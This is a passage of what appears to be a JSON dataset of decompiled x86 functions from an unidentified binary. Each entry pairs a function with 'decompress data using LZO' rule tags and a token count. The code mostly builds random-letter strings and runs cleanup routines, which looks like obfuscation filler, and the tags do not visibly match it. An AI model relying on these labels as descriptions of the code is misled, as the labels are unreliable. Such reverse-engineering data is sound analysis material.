(uStack24 - 4) - uVar2))\n            goto code_r0x0042ccd7;\n            fcn.00401a32(uVar2);\n        }\n        uStack24 = uStack24 & 0xffffff00;\n        if (0xf < param_9) {\n            iVar3 = param_4;\n            if ((0xfff < param_9 + 1) && (iVar3 = *(param_4 + -4),  0x1f < (param_4 + -4) - iVar3))\n            goto code_r0x0042cce3;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = puStack84;\n        return puStack84;\n    }\n    iVar3 = iStack116;\n    if ((uStack96 + 1 < 0x1000) || (iVar3 = *(iStack116 + -4),  (iStack116 + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x0042cb97;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x0042ccbf:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x0042cccb:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x0042ccd7:\n    uStack76 = 3;\n    fcn.004047f5();\ncode_r0x0042cce3:\n    uStack76 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar2 = fcn.00403a76();\n    return uVar2;\n}\n",
        "token_count": 1722
    },
    "004027c5": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004027c5(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff38;\n    uint32_t in_stack_ffffff50;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cd70;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\";\n    auStack120[0] = 0x41;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x41, uStack84, \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x41, uStack36, \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n    if (uStack64 < 0x10) {\ncode_r0x00447c13:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00447f8a;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x41, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \n                     \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x41, uStack36, \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n        if (0xf < uStack64) {\n            in_stack_ffffff50 = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff50) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x00447f96;\n                in_stack_ffffff50 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff50 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff50) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00447fa2;\n                in_stack_ffffff50 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x41, in_stack_ffffff50 & 0xffffff00 | uStack84 & 0xff, \n                     \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x41, uStack36, \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n        if (0xf < uStack64) {\n            in_stack_ffffff38 = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff38) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x00447fae;\n                in_stack_ffffff38 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff38 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff38) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00447fba;\n                in_stack_ffffff38 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x41, in_stack_ffffff38 & 0xffffff00 | uStack84 & 0xff, \n                     \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x41, uStack36, \"toopqvkzcuipdfffbtueolildtxnodmjrpymkkktwaiweajhmpvjqahpjrmfalval\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00447fc6;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00447fd2;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00447fde;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x00447c07:\n        fcn.00401a32(uVar2);\n        goto code_r0x00447c13;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x00447c07;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00447f8a:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00447f96:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00447fa2:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00447fae:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00447fba:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00447fc6:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00447fd2:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00447fde:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2449
    },
    "00402806": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.00402806(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ce30;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    pcStack88 = \"cualxmyhwegxfevknfpeyguebyqgqmjwhfrzlkqtktabetfckprszfjmcos\";\n    auStack96[0] = 0x3b;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x2b, uStack36, \"hrqpcdqhyexwowvssbxyybovjfxmlakelysxriukmbx\");\n    if (0xf < uStack40) {\n        iVar2 = iStack60;\n        if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0044af55;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < uStack64) {\n        iVar2 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2)) {\ncode_r0x0044af55:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            uVar1 = fcn.00403a76();\n            return uVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return 0;\n}\n",
        "token_count": 610
    },
    "00402815": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00402815(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    int32_t in_stack_0000005c;\n    uint32_t in_stack_00000070;\n    uint32_t in_stack_ffffff50;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44c800;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xb;\n    pcStack112 = \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\";\n    auStack120[0] = 0x37;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x37, uStack84, \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x37, uStack36, \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\");\n    if (uStack64 < 0x10) {\ncode_r0x004377aa:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00437b58;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x37, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \n                     \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x37, uStack36, \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\");\n        if (0xf < uStack64) {\n            in_stack_ffffff50 = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff50) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x00437b64;\n                in_stack_ffffff50 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff50 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff50) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00437b70;\n                in_stack_ffffff50 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x37, in_stack_ffffff50 & 0xffffff00 | uStack84 & 0xff, \n                     \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xd;\n        fcn.00402f72(0x37, uStack36, \"yrbzngcmacuxdeixrzomxkwwluklnrunybughrhdplyppweyymdspiq\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x00437b7c;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00437b88;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00437b94;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x00437ba0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar2 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar2 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar2)) goto code_r0x00437bac;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar2 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar2 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar2)) goto code_r0x00437bb8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000070) {\n            iVar2 = in_stack_0000005c;\n            if ((0xfff < in_stack_00000070 + 1) &&\n               (iVar2 = *(in_stack_0000005c + -4),  0x1f < (in_stack_0000005c + -4) - iVar2)) goto code_r0x00437bc4;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x54257c;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x0043779e:\n        fcn.00401a32(uVar1);\n        goto code_r0x004377aa;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x0043779e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00437b58:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00437b64:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00437b70:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00437b7c:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00437b88:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00437b94:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00437ba0:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00437bac:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x00437bb8:\n    uStack20 = 9;\n    fcn.004047f5();\ncode_r0x00437bc4:\n    uStack20 = 10;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2562
    },
    "00402838": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402838(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000024;\n    uint32_t in_stack_00000038;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack24 = 0x44cb30;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 7;\n    pcStack112 = \"vebrbsfyjuakbpblbybjwikidtxyay\";\n    auStack120[0] = 0x1e;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x1e, uStack84, \"vebrbsfyjuakbpblbybjwikidtxyay\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x1e, uStack36, \"vebrbsfyjuakbpblbybjwikidtxyay\");\n    if (uStack64 < 0x10) {\ncode_r0x00440f0a:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0044111e;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 8;\n        fcn.00402f72(0x1e, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \"vebrbsfyjuakbpblbybjwikidtxyay\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x1e, uStack36, \"vebrbsfyjuakbpblbybjwikidtxyay\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0044112a;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00441136;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x00441142;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar3 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar3 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar3))\n            goto code_r0x0044114e;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000038) {\n            iVar3 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (iVar3 = *(in_stack_00000024 + -4),  0x1f < (in_stack_00000024 + -4) - iVar3)) goto code_r0x0044115a;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x00440efe:\n        fcn.00401a32(uVar2);\n        goto code_r0x00440f0a;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x00440efe;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044111e:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044112a:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00441136:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00441142:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0044114e:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0044115a:\n    uStack20 = 6;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1648
    },
    "00402842": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00402842(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_0000001c;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c000;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x33);\n    if (0xf < uStack40) {\n        iVar1 = aiStack60[0];\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(aiStack60[0] + -4),  0x1f < (aiStack60[0] + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x0041f1c0;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < in_stack_0000001c) {\n        iVar1 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar1 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar1)) {\ncode_r0x0041f1c0:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x541f18;\n}\n",
        "token_count": 496
    },
    "00402941": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00402941(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ccd0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"flmxtprjbabhfmlfcovtlmvtedcsjfiwixqu\";\n    auStack144[0] = 0x24;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x34, iStack60, \"vpxkzwbuqbqysjwrjwxbgfvxjjjmcaflwubfuljrdqrmgfhckgfp\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x34, uStack84, \"vpxkzwbuqbqysjwrjwxbgfvxjjjmcaflwubfuljrdqrmgfhckgfp\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x34, uStack36, \"vpxkzwbuqbqysjwrjwxbgfvxjjjmcaflwubfuljrdqrmgfhckgfp\");\n    if (uStack64 < 0x10) {\ncode_r0x00445fb7:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00446279;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x24, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \"flmxtprjbabhfmlfcovtlmvtedcsjfiwixqu\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x24, uStack36, \"flmxtprjbabhfmlfcovtlmvtedcsjfiwixqu\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x00446285;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00446291;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x24, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \"flmxtprjbabhfmlfcovtlmvtedcsjfiwixqu\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x24, uStack36, \"flmxtprjbabhfmlfcovtlmvtedcsjfiwixqu\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 